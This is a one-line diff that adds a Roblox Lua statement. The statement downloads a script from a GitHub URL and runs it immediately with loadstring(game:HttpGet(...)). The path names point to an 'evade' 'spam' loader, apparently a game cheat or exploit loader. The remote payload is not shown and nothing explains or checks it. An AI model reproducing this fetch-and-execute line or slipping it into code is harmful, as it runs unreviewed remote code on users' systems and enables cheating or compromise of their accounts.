@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/hlwn-evade-spam1-gti29fdik6vxy6.lua"))()
